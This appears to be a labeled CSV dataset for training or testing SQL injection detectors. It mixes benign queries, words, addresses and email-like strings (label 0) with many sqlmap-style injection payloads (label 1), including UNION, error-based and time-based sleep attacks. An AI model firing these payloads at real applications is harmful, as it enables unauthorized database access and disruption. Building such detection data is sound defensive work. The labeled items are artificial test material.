Query,Label
"-6848""   )    )    Or 4071  =  5312",1
"1""   )    )    aNd 3754  =    (  sElECt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElECt   (  caSE WhEN   (  3754  =  3754  )   thEN 1 eLSE 0 EnD  )   fROM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fROM dual  )   aNd    (    (   ""auyv""  =  ""auyv",1
falerno,0
"SELECT COUNT ( blanket ) , took FROM none BY seat",0
79,0
d9str7par,0
1' AND 6240  =    (  'qqpjq'||  (  sEleCt CAse 6240 WHen 6240 THen 1 ELSE 0 EnD from rdb$DAtABAsE  )  ||'qzvzq'  ),1
"1%'   )    )     )   or 8315  =    (  select count  (  *  )   froM sysibm.systables aS t1,sysibm.systables aS t2,sysibm.systables aS t3  )   and    (    (     (  '%'  =  '",1
varley@tecnoindomo.ki,0
49694,0
"sElecT * frOM users WhErE id  =  1 OR  1<@  =  1 unIoN sElecT 1,VErSiON  (    )   -- 1",1
"-9725'  )   UNion AlL SELect 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",1
"SELECT * FROM lovely ORDER BY practice, ship",0
"SELECT * FROM shine ORDER BY owner ASC, soon DESC",0
stanger-kitabayashi7@gestionsoftware.th,0
"1"" wHeRe 7631  =  7631 and 4733  =  3439",1
"INSERT INTO steady  ( kitchen, far, source )  VALUES  ( 'bear', 'ride', 'provide' )",0
"1"" oR row  (  1045,7562  )  >  (  SelecT count  (  *  )  ,concat  (  0x7171706a71,  (  SelecT   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x fROm   (  SelecT 8488 UNiOn SelecT 5584 UNiOn SelecT 3051 UNiOn SelecT 1210  )  a grOUP By x  )",1
"SELECT * FROM till WHERE garage BETWEEN ""unhappy"" AND    ""double""",0
SELECT TOP 50 PERCENT * FROM fallen,0
1'  )   AS rhvm WHEre 1420  =  1420,1
"calle alfred nobel, 42 7-g",0
SELECT * FROM represent WHERE exactly NOT LIKE 'toy%',0
1' AnD 4595  =  4595#,1
SELECT COS ( 2 ) ;,0
SELECT TOP 3 * FROM share WHERE grew = 'greatest' SELECT * FROM fireplace,0
"1 WhERE 6040  =  6040 ANd 9660  =    (  SeleCt count  (  *  )   FrOm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1' Or   (  selEcT 9173 FRom  (  selEcT count  (  *  )  ,concat  (  0x7171706a71,  (  selEcT   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FRom information_schema.character_sets gRoUP by x  )  a  )   anD 'wwwb'  =  'wwwb",1
1'  )   wHerE 5214  =  5214,1
5.97528E+15,0
1   )    )     )   aND 3715 iN    (    (   cHAR  (  113  )  +cHAR  (  113  )  +cHAR  (  112  )  +cHAR  (  106  )  +cHAR  (  113  )  +  (  SeLect   (  CAse wHEn   (  3715  =  3715  )   then cHAR  (  49  )   ElSE cHAR  (  48  )   End   )    )   +cHAR  (  113  )  +cHAR  (  122  )  +cHAR  (  118  )  +cHAR  (  122  )  +cHAR  (  113   )    )     )   aND    (    (     (  9548  =  9548,1
4341,0
"1   )    )     )   uNiOn alL sELECT nuLl,nuLl,nuLl,nuLl,nuLl,nuLl--",1
s-ierro,0
SELECT * FROM dozen WHERE verb NOT LIKE 'clothing%',0
shan-min,0
SELECT TOP 50 PERCENT * FROM element,0
1' AND sleep  (  5  )  #,1
"1""   )    )    aNd   (  1248  =  8705  )  *8705 aNd    (    (   ""wvma"" lIke ""wvma",1
3525,0
6r5int3805,0
leyton@intg.tk,0
SELECT AVG ( relationship ) FROM when SELECT SUM ( consist ),0
"SElect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frOM dual And   (  ""%""  =  """,1
h46a00o,0
SELECT AVG ( tax ) FROM cookies SELECT SUM ( blue ),0
SELECT * FROM simplest ORDER BY butter,0
98011650w,0
SELECT AVG ( draw ) FROM help SELECT SUM ( chart ),0
"1""  )   WHERe 1416  =  1416 uNIon AlL sElEcT nuLl,nuLl,nuLl#",1
"1 AND cHaR  (  107  )  ||cHaR  (  121  )  ||cHaR  (  97  )  ||cHaR  (  80  )    =  regexp_substring  (  repeat  (  lefT  (  crypt_key  (  cHaR  (  65  )  ||cHaR  (  69  )  ||cHaR  (  83  )  ,nulL  )  ,0  )  ,500000000  )  ,nulL  )  --",1
boagne,0
SELECT * FROM call FETCH FIRST 50 PERCENT ROWS ONLY,0
Or 0  =  0 --,1
rebalg1r,0
1 whERE 5080  =  5080,1
"SELECT * FROM having WHERE planning BETWEEN ""avoid"" AND    ""lot""",0
tinti@21horas.hr,0
"-8093""   )    )    aS oboi WhERe 1476  =  1476 Union ALL seleCT 1476,1476,1476,1476#",1
SELECT * FROM impossible WHERE climb = 'include'  AND  ( sky = 'snow' OR motor = 'gate' ),0
SELECT MIN ( flies )  AS discovery FROM related,0
1'   )    )    aS mbzk wHERe 9153  =  9153 AND 2006  =  2006,1
SELECT test ( s )  FROM open FULL OUTER JOIN,0
SELECT * FROM surface WHERE trap = 'iron',0
"calle profesor angel lacalle, s/n,",0
"-8144'  )   WHerE 1691  =  1691 OR elt  (  7246  =  7816,7816  )  --",1
1'  )   anD 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SelecT   (  casE wHeN   (  4386  =  4386  )   ThEN 1 ELsE 0 eNd  )   FrOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anD   (  'sgdj' LIke 'sgdj,1
"-4955%' UniON alL SElect 5928,5928--",1
"1"" or   (  sELEcT 9173 fRom  (  sELEcT count  (  *  )  ,concat  (  0x7171706a71,  (  sELEcT   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x fRom information_schema.character_sets grOUp by x  )  a  )   anD ""bkrk""  =  ""bkrk",1
hymen_israeli@aulahost.vc,0
"SELECT * FROM he ORDER BY usually ASC, rapidly DESC",0
"1 Or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  sELeCT   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",1
1' AND SlEEP  (  5  )   AND 'kapr'  =  'kapr,1
prell@davidymamen.tc,0
"1'  )   anD updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SelecT   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   anD   (  'dtym'  =  'dtym",1
SELECT * FROM climate 3,0
1'  )   aND 1987  =  3756#,1
SELECT * FROM collect WHERE newspaper BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT column_name FROM table1 UNION,0
azuqueca de henares,0
"1""   )    )     )   UniOn all SElecT nUlL--",1
"1' WheRE 5786  =  5786 AND elt  (  1210  =  1210,sleEP  (  5   )    )   --",1
"1  )   WhErE 1013  =  1013 aNd 4241  =  ConVeRT  (  int,  (  sELect chAR  (  113  )  +chAR  (  113  )  +chAR  (  112  )  +chAR  (  106  )  +chAR  (  113  )  +  (  sELect   (  CASe WHEN   (  4241  =  4241  )   tHen chAR  (  49  )   eLSe chAR  (  48  )   EnD   )    )   +chAR  (  113  )  +chAR  (  122  )  +chAR  (  118  )  +chAR  (  122  )  +chAR  (  113   )    )     )  --",1
"1'||  (  SelECt 'yaii' froM dual wHERe 7317  =  7317 UniOn All SelECt nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL#",1
DELETE FROM tomorrow WHERE solar = 'to',0
"1 or 5356  =    (  SElECt count  (  *  )   FroM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7  )  --",1
"c/ gustavo adolfo becquer 91,",0
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0
SELECT * FROM chapter,0
"-7491""  )   aS cnrn WhERE 3635  =  3635 orDeR By 1#",1
1' WHERe 8729  =  8729,1
"1' WhErE 8837  =  8837 And 5556  =    (  sElEcT count  (  *  )   From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
ludolfo,0
SELECT park ( s )  FROM contrast LEFT JOIN,0
"-9032   )    )    UniOn alL selECT 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1
19262,0
"SELECT satisfiedID AS ID, skill AS press FROM poetry",0
"SELECT them, control+ ', ' + slabs+ ' ' + upward+ ', ' + chosen AS name  FROM everything",0
"SELECT * FROM solve ORDER BY more, terrible",0
botosso@mytanga.cf,0
SELECT * FROM watch FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM remember,0
oretana,0
SELECT * FROM since FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM toward,0
c26ve7sar,0
SELECT * FROM  ( SELECT service FROM series ),0
"1'||  (  sELect 'jonh' from dual whERE 2415  =  2415 UnioN ALL sELect nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL,nuLL--",1
SELECT * FROM yourself WHERE degree = 'nest' LIMIT 3,0
laureano,0
28609,0
"1""   )    )    unIon ALl sElECT NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL--",1
"admin""  )   Or   (  ""1""  =  ""1""--",1
"1%""  )   uNion ALl sElECT nUll,nUll,nUll,nUll,nUll#",1
passatge de manyer 105,0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( climate )  FROM attack,0
33s4h9929r,0
DELETE FROM rubber WHERE how = 'dirty',0
"SELECT pony AS vessels, dig AS [matter]  FROM anyway",0
SELECT * FROM equator WHERE quickly = 'cloth' FETCH FIRST 3 ROWS ONLY,0
1   )    )     )   anD 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLeCT   (  cAse WhEN   (  4386  =  4386  )   THeN 1 elSE 0 eNd  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anD    (    (     (  8023  =  8023,1
fulmer,0
SELECT * FROM sun WHERE swimming = 'material' FETCH FIRST 3 ROWS ONLY,0
"-3649""   )    )    as eydu wHeRe 3220  =  3220 Or elt  (  8705  =  1510,1510  )  --",1
-3956'  )   oR   (  8459  =  8459  )  *4906 aND   (  'rflo' liKe 'rflo,1
"SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.feltID ORDER BY Orders.totalID",0
SELECT DISTINCT sides FROM wire,0
7118,0
1  )   WHERe 7680  =  7680 aND 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selEct   (  CasE WhEn   (  7756  =  7756  )   THEn 1 ELse 0 eND  )   FRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1   )    )    aS xutu wheRe 5811  =  5811 oR cHaR  (  75  )  ||cHaR  (  70  )  ||cHaR  (  99  )  ||cHaR  (  83  )    =  regexp_substring  (  repeat  (  lEFt  (  crypt_key  (  cHaR  (  65  )  ||cHaR  (  69  )  ||cHaR  (  83  )  ,nuLL  )  ,0  )  ,500000000  )  ,nuLL  )  --",1
nab,0
SELECT * FROM living,0
46842,0
46225556h,0
SELECT * FROM together WHERE somehow = 'previous',0
SELECT * FROM summer WHERE jungle IN  ( SELECT push FROM fence ),0
erny1,0
18179,0
ddimo,0
SELECT surprise FROM purpose,0
87811832v,0
"1' UNIoN ALL seLecT nUll,nUll,nUll#",1
31587,0
gracindo@ajuntamentbcn2-0.jp,0
"1  )   uNIOn all seLEct NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl,NuLl#",1
1'+  (  sELECT somn WhErE 8636  =  8636 rlike sleep  (  5   )    )   +',1
"1  )   aND elt  (  4249  =  4249,7259  )",1
SELECT AVG ( Price ) FROM spread,0
SELECT AVG ( Price ) FROM breathe,0
"1'  )   or 8514  =  BeNChMark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
96761343k,0
"-6733'  )   wheRE 4024  =  4024 UnION alL sELeCt 4024,4024,4024,4024#",1
SELECT MIN ( bag )  AS engineer FROM jump,0
"SEleCt * FROM users WHERe id  =  1 -@<@ union SEleCt NUll,version  (    )   -- 1",1
SELECT * FROM snow WHERE brick BETWEEN 'how' AND 'has',0
"1%' uNion alL select nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl,nuLl#",1
"-3151%""   )    )     )   uNiOn aLl SeLECt 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1
73361115q,0
SELECT COUNT ( reportID ) FROM swimming,0
"1""   )    )    oR 5286  =    (  SelECt count  (  *  )   FroM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aND    (    (   ""lano""  =  ""lano",1
SELECT * FROM  ( SELECT bet FROM orange ),0
"1""  )   WhERE 8254  =  8254 AnD cHAR  (  107  )  ||cHAR  (  121  )  ||cHAR  (  97  )  ||cHAR  (  80  )    =  regexp_substring  (  repeat  (  LEFT  (  crypt_key  (  cHAR  (  65  )  ||cHAR  (  69  )  ||cHAR  (  83  )  ,nuLl  )  ,0  )  ,500000000  )  ,nuLl  )  --",1
"1""   )    )    As riui wHERe 2605  =  2605",1
"SELECT are, zulu+ ', ' + practical+ ' ' + hour+ ', ' + beside AS correctly  FROM go",0
36lis8r,0
"1'  )   wheRE 7646  =  7646 And 3580  =    (  SELeCt count  (  *  )   froM domain.domains aS t1,domain.columns aS t2,domain.tables aS t3  )  --",1
SELECT map ( s )  FROM outside LEFT JOIN,0
1'+  (  SeLecT tzvm wHERE 5145  =  5145 AnD 4192  =  7437#,1
SELECT something FROM completely UNION ALL SELECT broken FROM welcome ORDER BY lamp,0
DELETE FROM thumb WHERE rise = 'review',0
-1459'   )    )     )   Or 5903  =    (  'qqpjq'||  (  SELECT caSe 5903 whEn 5903 theN 1 ELSE 0 ENd fROm rdb$daTAbASe  )  ||'qzvzq'  )   And    (    (     (  'eiet' like 'eiet,1
SELECT bowl ( s )  FROM piano,0
-4542'   )    )    orDer By 1#,1
1' aND 9198  =  9198--,1
1052,0
SELECT AVG ( conversation ) FROM plenty,0
1' aND 2316  =  7236,1
SELECT AVG ( pen ) FROM sand SELECT SUM ( maybe ),0
&1c,1
SELECT TOP 3 * FROM halfway SELECT * FROM slide 3SELECT * FROM desk,0
SELECT TOP 3 * FROM equipment,0
SELECT * FROM upward WHERE sound LIKE '%out%',0
1'   )    )     )   AND   (  3020  =  3020  )  *6703 AND    (    (     (  'nhrc' LiKE 'nhrc,1
"SELECT column_name ( s )  FROM seat,labor",0
SELECT * FROM dirt FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( melted ) FROM greatly,0
"1,  (  seLecT   (  caSE When   (  5217  =  5217  )   then 1 ELSe 5217*  (  seLecT 5217 froM mysql.db  )   END   )    )",1
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,0
UPDATE serve SET official = 'colony'WHERE labor = 'dark',0
open3,0
-4681 OR 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SeLeCT   (  CaSE whEn   (  4747  =  4747  )   then 1 elSe 0 END  )   FrOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1
"1%""   )    )     )   OR 7417  =    (  SELECt count  (  *  )   from sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables AS t3  )  --",1
etchieso,0
"c/ curadero, 101, 12?e",0
SELECT MIN ( food )  AS source FROM both,0
8.0957E+15,0
SELECT * FROM rice WHERE bar BETWEEN '1996-07-01' AND '1996-07-31',0
serret@sierradealcaraz.dj,0
1  )   As bpap WHERE 7758  =  7758 or 4240  =    (  sElEcT 4240 fROM pg_sleep  (  5   )    )   --,1
steele,0
argecilla,0
"SELECT journeyID AS ID, circle AS tall FROM clock",0
SELECT * FROM near WHERE    NOT eager = 'body',0
"SELECT * FROM possibly ORDER BY concerned ASC, could DESC",0
SELECT option_value FROM wp_options WHERE option_name  =  'sm_on_fly' LIMIT 1,0
SELECT * FROM to WHERE rise IN  ( SELECT difficulty FROM willing ),0
feutlins,0
SELECT * FROM cave WHERE card BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM began,0
7.77E+15,0
sanabria,0
SELECT TOP 3 * FROM fewer WHERE spend = 'library',0
SELECT * FROM stop WHERE chart NOT LIKE '[cutting]%',0
guciz,0
"calle bir ganduz, 90",0
SELECT AVG ( moment ) FROM plant SELECT SUM ( shake ),0
"1""   )    )    anD 3202  =  LikE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    anD    (    (   ""yrgy"" LikE ""yrgy",1
spnola ballado,0
"1',  (  begin if   (  8340  =  8340  )   tHeN dbms_lock.sleEP  (  5  )",1
medel pujolriu,0
"1'+  (  SELecT lgkd WhErE 7801  =  7801 aND elt  (  4249  =  4249,7259   )    )   +'",1
"1   )    )     )   oR row  (  1045,7562  )  >  (  sELEct count  (  *  )  ,concat  (  0x7171706a71,  (  sELEct   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x frOm   (  sELEct 8488 UNION sELEct 5584 UNION sELEct 3051 UNION sELEct 1210  )  a grOUP by x  )   and    (    (     (  1782  =  1782",1
48710,0
"-8203   )    )    AS eqlf wHEre 6132  =  6132 uniON All SeLecT 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1
agn,0
"-1366' oR make_set  (  9354  =  9354,7185  )   aND 'abre'  =  'abre",1
SELECT COUNT ( furnitureID ) FROM carry,0
bravat-a,0
1' wHeRE 3362  =  3362,1
SELECT metal ( s )  FROM involved LEFT JOIN,0
"1""   )    )    OR SlEeP  (  5  )  #",1
SELECT away ( s )  FROM clothing FULL OUTER JOIN,0
2.04422E+15,0
SELECT TOP 50 PERCENT * FROM locate SELECT * FROM death FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM greater,0
SELECT again ( s )  FROM sets LEFT JOIN,0
"-1588%""   )    )     )   Or 1 Group by concat  (  0x7171706a71,  (  SElECT   (  caSe wHeN   (  4232  =  4232  )   theN 1 elsE 0 eND   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    HaviNG min  (  0  )  #",1
a',1
callosar,0
"1""  )   OR 8466  =  bEnCHMarK  (  5000000,md5  (  0x694a4745   )    )    aNd   (  ""ubvd""  =  ""ubvd",1
1'  )   Where 5680  =  5680 anD   (  3020  =  3020  )  *6703--,1
SELECT TOP 3 * FROM plenty,0
"1'   )    )    AS mdtm Where 1393  =  1393 And chaR  (  107  )  ||chaR  (  121  )  ||chaR  (  97  )  ||chaR  (  80  )    =  regexp_substring  (  repeat  (  leFt  (  crypt_key  (  chaR  (  65  )  ||chaR  (  69  )  ||chaR  (  83  )  ,NULl  )  ,0  )  ,500000000  )  ,NULl  )  --",1
1'  )   ANd SleeP  (  5  )   ANd   (  'xecl' lIKE 'xecl,1
"UPDATE solve SET load =  'trick', City =  'sense' WHERE citizen =  contain",0
SELECT * FROM remove WHERE indicate BETWEEN copper09/01/1996them AND easier15/31/1996couple,0
eflujo,0
1'  )   whERe 9317  =  9317 Or 6793  =    (  SEleCt 6793 frOM pg_sleep  (  5   )    )   --,1
"-8245""   )    )    oR 3038  =  3038",1
torrente zaldvar,0
SELECT TOP 3 * FROM alive SELECT * FROM black 3SELECT * FROM completely,0
SELECT * FROM salt WHERE sale LIKE '%scientist%',0
"SELECT Orders.probablyrID, Employees.place, Employees.there FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.rodID ORDER BY Orders.physicalID",0
scott,0
SELECT * FROM loose WHERE section = 'border' LIMIT 3,0
SELECT AVG ( heard )  FROM position  SELECT SUM ( thing ),0
SELECT TOP 50 PERCENT * FROM attack,0
"UPDATE needle SET draw =  'zoo', City =  'wealth' WHERE fill =  relationship",0
"1'  )   or chaR  (  68  )  ||chaR  (  69  )  ||chaR  (  97  )  ||chaR  (  85  )    =  regexp_substring  (  repeat  (  RIghT  (  chaR  (  5389  )  ,0  )  ,5000000000  )  ,NulL  )",1
"1""  )   As saqy wHERE 9704  =  9704   (  SELeCt   (  casE WHeN   (  4587  =  4587  )   tHeN regexp_substring  (  repeat  (  Left  (  crypt_key  (  CHAr  (  65  )  ||CHAr  (  69  )  ||CHAr  (  83  )  ,NuLL  )  ,0  )  ,500000000  )  ,NuLL  )   ElSE CHAr  (  76  )  ||CHAr  (  65  )  ||CHAr  (  102  )  ||CHAr  (  72  )   EnD  )   fROM   (  vALuES  (  0   )    )     )  --",1
incisivo,0
SELECT * FROM completely FETCH FIRST 3 ROWS ONLY,0
1  )   wHEre 4780  =  4780,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbce94a85edc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
DELETE FROM captain WHERE clothing = 'those',0
1%'  )   waitfor delay '0:0:5'--,1
"1""  )   As jiiq wHeRe 6847  =  6847",1
SELECT COUNT ( pick ) FROM stop,0
9639,0
"1%'   )    )     )   oR CHar  (  75  )  ||CHar  (  70  )  ||CHar  (  99  )  ||CHar  (  83  )    =  regexp_substring  (  repeat  (  LeFt  (  crypt_key  (  CHar  (  65  )  ||CHar  (  69  )  ||CHar  (  83  )  ,nuLl  )  ,0  )  ,500000000  )  ,nuLl  )  --",1
SELECT TOP 3 * FROM yellow,0
1'   )    )    AND 2832  =  4165--,1
angilberto,0
roni,0
SELECT * FROM science WHERE blood NOT BETWEEN 'raise' AND 'shaking',0
1' WHErE 6406  =  6406,1
rupp@djbroadcast.gov,0
SELECT * FROM play ORDER BY taught DESC,0
SELECT * FROM save WHERE spread BETWEEN potatoes09/01/1996we AND salmon15/31/1996baseball,0
pladeval berganciano,0
1 rlike SlEEP  (  5  )  -- muhp,1
SELECT DISTINCT claws FROM gentle,0
1'+  (  SeLeCt ejaj whERe 1651  =  1651 or 6793  =    (  SeLeCt 6793 frOM pg_sleep  (  5   )    )     )  +',1
"-9820"" OR 1038  =  7502#",1
SELECT * FROM daughter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM younger,0
"1""  )   WHErE 5870  =  5870 UniOn AlL SeLECT NuLL,NuLL,NuLL--",1
"-7996""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELect   (  casE When   (  4747  =  4747  )   THeN 1 eLse 0 eND  )   FrOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anD    (    (   ""iuzv"" LiKe ""iuzv",1
"1""  )   AS cysq WHEre 5258  =  5258",1
5.62626E+14,0
errol@diseodesoftware.ml,0
pompa,0
"-5064  )   aS mzxc WHerE 1889  =  1889 Or 1570  =  COnVErt  (  int,  (  sElecT ChAR  (  113  )  +ChAR  (  113  )  +ChAR  (  112  )  +ChAR  (  106  )  +ChAR  (  113  )  +  (  sElecT   (  CaSE When   (  1570  =  1570  )   THEn ChAR  (  49  )   ElsE ChAR  (  48  )   End   )    )   +ChAR  (  113  )  +ChAR  (  122  )  +ChAR  (  118  )  +ChAR  (  122  )  +ChAR  (  113   )    )     )  --",1
einar,0
"SELECT find,stick,maybe,never,fix     (  (  fat JOIN program ON now.interest =  community.shut )   INNER JOIN planningON Orders.gone =  cookies.riseID )",0
"INSERT INTO fox ( helpful, being, like, harder, pound, contain )  VALUES  ( 'growth', 'attention'. should', 'clearly', 'instead', 'studied', 'ahead' )",0
SELECT AVG ( cat )  FROM traffic  SELECT SUM ( percent ),0
SELECT * FROM composed WHERE machine IN  ( SELECT thou FROM beautiful ),0
"-8734%""  )   OR 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SEleCt   (  cASE whEn   (  4493  =  4493  )   THeN 1 eLsE 0 eNd  )   FrOm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    ANd   (  ""%""  =  """,1
valido casademont,0
bolkan@directoriogratuito.int,0
1   )    )    As skex WhEre 7941  =  7941 AND sLEEP  (  5  )  --,1
